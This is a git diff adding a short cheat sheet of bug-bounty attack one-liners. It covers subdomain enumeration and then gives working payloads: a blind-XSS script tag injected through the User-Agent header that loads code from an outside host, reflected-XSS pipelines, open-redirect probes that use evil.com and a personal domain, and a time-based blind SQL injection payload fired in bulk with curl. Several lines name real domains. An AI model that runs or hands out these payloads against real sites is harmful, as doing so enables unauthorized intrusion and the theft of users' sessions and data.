@@ -1,0 +1,29 @@
+subdomain enumeration
+amass enum -ip -src -brute -df domains -config config.ini 
+https://subdomainfinder.c99.nl/whois/digitalencode.net
+ 
+cat subdomain.txt | waybackurls | httpx -H "User-Agent: \"><script src=https://chirag.bxss.in></script>" --screenshot
+cat subdomains | httpx -silent | katana -d 10 -silent | gf xss | Gxss -c 100 -p XssReflected | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
+cat iplist| httpx -silent -path /xmlrpc.php -title -match-string "XML-RPC" ==> then search exploit xmlrpc
+httpx -l all-alive-subs.txt -path "///evil.com" -status-code -mc 302 
+echo "http://tesla.com" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew 
+waybackurls test.com | grep -a -i \=http | qsreplace 'https://hossamshady.me' | while read host do ;do curl -s -L $host -I| grep "hossamshady.me" && echo "$host \033[0;31mVulnerable\n";done
+
+BLIND SQLI
+cat recon.txt | grep "=" | gsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(25)))SUmc)" >> blind.txt ==> to wait for 25 seconds
+ cat blind.txt | parallel -j50 -q curl -o /dev/null -s -w %{time_total}\\n	==> to count time blind if 25 then vulnerable
+
+
+
+fuzzing 
+gobuster dir -u https://example.com -w wordlist 
+
+
+
+
+
+
+
+
+
+
